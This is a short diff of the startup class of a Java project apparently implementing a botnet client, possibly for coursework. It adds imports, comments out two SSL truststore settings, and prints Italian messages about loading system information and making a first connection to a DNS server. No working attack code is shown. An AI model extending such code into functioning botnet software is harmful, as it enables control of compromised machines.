@@ -1,12 +1,18 @@
 package cs.sii.abotnet;
 
 import java.awt.List;
+import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.IOException;
+import java.io.InputStream;
 import java.net.HttpURLConnection;
 import java.net.InetAddress;
 import java.net.URI;
 import java.net.URL;
+import java.net.URLDecoder;
 import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.Properties;
 
 import javax.servlet.ServletRequest;
 import javax.servlet.http.HttpServletRequest;
@@ -57,13 +63,18 @@ public class Application {
 
 	}
 
+
+	
 	@Bean
 	public CommandLineRunner commandLineRunner(ApplicationContext ctx) {
 		return args -> {   
-			System.setProperty("javax.net.ssl.keyStoreType", "JKS");
-			System.setProperty("javax.net.ssl.trustStrore", "cacerts.jks");
+//			System.setProperty("javax.net.ssl.keyStoreType", "JKS");
+//			System.setProperty("javax.net.ssl.trustStrore", "cacerts.jks");
 			System.out.println("CARICO CONFIGURAZIONI E INFORMAZIONI DI SISTEMA");
 			init.loadInfo();
+
+			
+			
 			System.out.println("EFFETTUO PRIMA CONNESIONE AL DNS SERVER");
 
 
